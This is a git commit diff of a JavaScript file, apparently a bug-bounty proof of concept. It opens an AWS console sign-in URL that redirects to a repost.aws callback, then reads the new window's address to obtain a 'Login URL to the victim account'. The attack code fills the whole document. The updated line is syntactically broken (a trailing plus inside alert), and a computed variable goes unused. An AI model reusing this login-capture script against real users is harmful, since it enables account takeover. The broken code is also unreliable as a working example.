05bf00bd357fdbfa9c1d643129d8cdb800b7aafc
yipman16 <83105601+yipman16@users.noreply.github.com>
2024-09-26 19:25:01 +0300

    Update h1.js

--- h1.js
+++ h1.js
@@ -1,14 +1,16 @@
 
 // Open a new window
-let newWindow = window.open('https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6Inllbm93eHMwUmlPdXhidHFHcFhFbHcifQ&challenge=SEgCKqJxJg6-MxlrcV-RijKA7PqwOb-vbVom6riw_ZE', '_blank');
+let newWindow = window.open('https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2F%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6IlhtWUI1V2hSUXdHN2IxX2RUZ1ZqSmcifQ&challenge=DU8HEwzh_enBtW4w7CNZGr1dwx-lrxMZa58_EL0ezGQ', '_blank');
 
 // Check if the new window was successfully created
 if (newWindow) {
   // Wait for 5 seconds before accessing the URL of the new window
   setTimeout(function () {
     // Access the URL of the new window
-    console.log("The URL of the new window is: " + newWindow.location.href);
+    let url = newWindow.location.href;
+    let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
+    alert("Login URL to the victim account: " + );
   }, 5000); // 5000 milliseconds = 5 seconds
 } else {
-  console.log("New window could not be opened. Make sure pop-ups are allowed.");
+  alert("nothing :(");
 }
